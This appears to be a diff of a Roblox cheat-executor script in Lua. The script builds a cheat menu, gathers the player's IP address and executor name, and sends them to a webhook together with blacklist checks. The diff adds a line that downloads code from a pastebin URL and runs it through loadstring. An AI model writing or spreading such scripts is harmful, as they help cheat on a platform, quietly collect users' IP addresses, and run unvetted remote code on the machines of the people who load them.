@@ -2,7 +2,9 @@
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
+local RunService = game:GetService("RunService")
 local LocalPlayer = Players.LocalPlayer
+local Camera = workspace.CurrentCamera
 local requestFunction = (syn and syn.request) or (http and http.request) or (http_request) or (fluxus and fluxus.request)
 
 -- === Executor Name sebelum UI ===
@@ -126,6 +128,7 @@ local function sendWebhook(ip, executor, isBlacklisted)
     })
 end
 
+-- === MAIN ===
 task.spawn(function()
     local ip, executor = getClientInfo()
     local username = LocalPlayer and LocalPlayer.Name or "Unknown"
@@ -139,13 +142,7 @@ task.spawn(function()
     local isIPBlacklisted = BlacklistedIPs[ip] or false
 
     local isBlacklistEnabled = not isTableEmpty(BlacklistedUsernames) or not isTableEmpty(BlacklistedIPs)
-    local isBlacklisted = false
-
-    if isBlacklistEnabled then
-        if isUsernameBlacklisted or isIPBlacklisted then
-            isBlacklisted = true
-        end
-    end
+    local isBlacklisted = isUsernameBlacklisted or isIPBlacklisted
 
     sendWebhook(ip, executor, isBlacklisted)
 
@@ -163,4 +160,6 @@ task.spawn(function()
     tabVisual:CreateParagraph({Title = "Visual", Content = "Fitur visual akan ditambahkan..."})
     tabCombat:CreateParagraph({Title = "Combat", Content = "Fitur combat akan ditambahkan..."})
     tabVehicle:CreateParagraph({Title = "Vehicle", Content = "Fitur kendaraan akan ditambahkan..."})
+
+    loadstring(game:HttpGet('https://pastebin.com/raw/2WpvBLUj'))()(tabVisual)
 end)
